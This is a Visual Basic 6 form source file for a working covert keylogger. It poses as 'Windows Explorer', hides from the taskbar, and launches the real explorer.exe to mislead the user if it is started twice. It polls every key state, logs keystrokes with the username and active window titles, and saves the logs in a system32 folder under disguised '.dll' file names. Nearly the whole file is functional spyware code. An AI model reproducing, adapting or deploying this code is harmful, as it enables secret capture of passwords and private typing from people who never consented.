VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Windows Explorer"
   ClientHeight    =   6000
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   6375
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6000
   ScaleWidth      =   6375
   StartUpPosition =   3  'Windows Default
   Begin VB.FileListBox File1 
      Height          =   3405
      Left            =   4680
      TabIndex        =   4
      Top             =   960
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.CommandButton Command2 
      Caption         =   "exit"
      Height          =   495
      Left            =   4920
      TabIndex        =   3
      Top             =   5400
      Width           =   1215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "DISABLE/ENABLE"
      Height          =   495
      Left            =   840
      TabIndex        =   2
      Top             =   5400
      Width           =   3855
   End
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   120
      Top             =   5400
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   1680
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   120
      Width           =   4455
   End
   Begin VB.TextBox Text1 
      Height          =   4695
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   480
      Width           =   6135
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   50
      Left            =   360
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'username import fun
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpbuffer As String, nSize As Long) As Long

'Active windowtitle part
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long

'keylogger part
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Dim wt, n As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer

Dim result As Integer

Private Sub Command1_Click()
If Timer1.Enabled = True Then
Timer1.Enabled = False
Else
Timer1.Enabled = True
End If
End Sub

Private Sub Command2_Click()
End
End Sub

Private Sub Form_Load()
'hiding app
App.TaskVisible = False
Me.Hide

'if program already running then confuse user that it is explorer
If App.PrevInstance = True Then
        Shell "C:\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
        End
End If

Text1.Text = Date & "," & Time & "," & username & vbCrLf 'prints info at startup

wt = 5 ' time to start logging after run
Timer2.Enabled = True 'enable timer to countdown from wt to 0

'if directory for recording does not exist create it
On Error Resume Next
MkDir "C:\WINDOWS\system32\sysResource"
File1.Path = "c:\windows\system32\sysResource"
End Sub

Private Sub Timer1_Timer()
For i = 1 To 255
 result = GetAsyncKeyState(i)
If result = -32767 Then
    If (i >= 65 And i <= 90) Or i = 32 Then
        Text1.Text = Text1.Text + correctcase(i)
    Else
        Text1.Text = Text1.Text + findkey(i)
        If i = 1 Then Text2.Text = GetActiveWindowTitle(True): Call recordnow
    End If
End If
Next i
End Sub
'''**********************finding symbol and number keys**********
Private Function findkey(ByVal b As Integer) As String
Select Case b
Case 48 To 57  'number keys above QWERTY
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    findkey = findsymb(b - 48) 'print symbols
    Else
    findkey = b - 48 'print numbers
    End If
    
Case 96 To 105  'Number keys from numpad
    findkey = b - 96
Case 192
    findkey = "~"
Case 189
    findkey = "-"
Case 187
    findkey = "="
Case 219
    findkey = "["
Case 186
    findkey = ";"
Case 222
    findkey = "'"
Case 221
    findkey = "]"
Case 188
    findkey = ","
Case 190
    findkey = "."
Case 191
    findkey = "/"
Case 220
    findkey = "\"
Case 111
    findkey = "/"
Case 106
    findkey = "*"
Case 109
    findkey = "-"
Case 107
    findkey = "+"
Case 160
    findkey = ""
Case 16
    findkey = ""


Case Else           'If key doesnt recognised ascii code will be displayed
    findkey = "[" & b & "]"
End Select
End Function
Private Function findsymb(b As Integer)
Select Case b
Case 1
findsymb = "!"
Case 2
findsymb = "@"
Case 3
findsymb = "#"
Case 4
findsymb = "$"
Case 5
findsymb = "%"
Case 6
findsymb = "^"
Case 7
findsymb = "&"
Case 8
findsymb = "*"
Case 9
findsymb = "("
Case 0
findsymb = ")"

Case Else
findsymb = "Shift+" & b
End Select
End Function
'***********start time********
Private Sub Timer2_Timer()
wt = wt - 1
If wt = 0 Then Timer1.Enabled = True: Timer2.Enabled = False
File1.Path = "c:\windows\system32\sysResource"          'counts files in dir to decide filename
n = File1.ListCount
End Sub
''*********************Username Import*********
Private Function username() As String
Dim sBuffer As String
    Dim lSize As Long
    sBuffer = Space$(255)
    lSize = Len(sBuffer)
    Call GetUserName(sBuffer, lSize)
    If lSize > 0 Then
        username = Left$(sBuffer, lSize)
    Else
        username = vbNullString
    End If
End Function
'************************Recordingtofile*********
Private Sub recordnow()
Open "C:\Windows\system32\sysResource\browse" & File1.ListCount + 1 & "xcz" & ".dll" For Output As #1
        Print #1, Text1.Text
Close #1
End Sub
'******************kEYCASEPART***********
Function correctcase(ByVal b As Integer) As String

Tmp = GetKeyState(vbKeyCapital)
If Tmp = 1 Then         'The Caps Lock Is On
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    correctcase = LCase(Chr(b)) 'print small letter
    Else
    correctcase = UCase(Chr(b)) 'print capital letter
    End If
Else            'The Caps Lock Is Off
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    correctcase = UCase(Chr(b)) 'print capital letter
    Else
    correctcase = LCase(Chr(b)) 'print small letter
    End If
End If
End Function

' ************************************Ativewindow title part******************************

' Returns the title of the active window.
' if GetParent = true then the parent window is
' returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hwnd As Long) As String
Dim l As Long
Dim s As String

l = GetWindowTextLength(hwnd)
s = Space(l + 1)

GetWindowText hwnd, s, l + 1

GetWindowTitle = Left$(s, l)
End Function

Private Sub Text2_Change()
Text1.Text = Text1.Text & vbNewLine & Time & " : " & GetActiveWindowTitle(True) & vbNewLine
End Sub
